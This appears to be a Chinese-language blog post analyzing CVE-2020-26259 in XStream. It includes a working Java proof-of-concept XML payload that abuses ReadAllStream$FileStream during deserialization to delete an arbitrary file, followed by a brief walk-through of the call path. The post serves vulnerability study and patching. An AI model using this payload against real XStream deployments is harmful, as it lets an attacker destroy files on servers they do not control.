---
layout:     post
title:      CVE-2020-26259漏洞分析
subtitle:   Xstream反序列化漏洞
date:       2020-12-29
author:     heria
header-img: img/post-bg-ios9-web.jpg
catalog: true
tags:
---



简介及介绍已在前篇介绍 直接开始复现及分析

## 0X01复现

```
import com.thoughtworks.xstream.XStream;
public class CVE {
    public static void main(String[] args) {
        String ssrf_xml = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "            <contentType>text/plain</contentType>\n" +
                "            <is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'>\n" +
                "              <tempFile>D:\\X-2020-26259\\DELE.txt</tempFile>\n" +
                "            </is>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";
        XStream xstream = new XStream();
        xstream.fromXML(ssrf_xml);
    }
}
```

其中文件路径自定义，执行后文件删除。

![在这里插入图片描述](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/20201215112032850.gif)

## 0X02分析

![image-20201229133909309](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201229133909309.png)

从poc中可以发现：CVE-2020-26259的poc中is元素为com.sun.xml.internal.ws.util.ReadAllStream$FileStream，这与上一个漏洞poc不一样。

值得注意的是，这次漏洞利用的不是Base64Data中get方法里的baos.readFrom(is)这个入口，而是位于它下面一行的is.close()这行代码。通过调试，程序在执行过get方法中baos.readFrom(is)后，紧接着执行is.Close()

此时的is是com.sun.xml.internal.ws.util.ReadAllStream$FileStream，跟入com.sun.xml.internal.ws.util.ReadAllStream$FileStream中的close方法

![image-20201229134509764](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201229134509764.png)

当com.sun.xml.internal.ws.util.ReadAllStream$FileStream对象的tempFile属性值不为空时，删除tempFile文件。

tempFile是com.sun.xml.internal.ws.util.ReadAllStream$FileStream对象的属性值，因此可以直接在poc中com.sun.xml.internal.ws.util.ReadAllStream$FileStream元素内构造tempFile属性元素，通过tempFile属性元素控制要删除的文件

![image-20201229134628013](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201229134628013.png)

## 0X03修复

![image-20201229155804783](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201229155804783.png)



## 0x04参考链接：

https://blog.csdn.net/caiqiiqi/article/details/111194893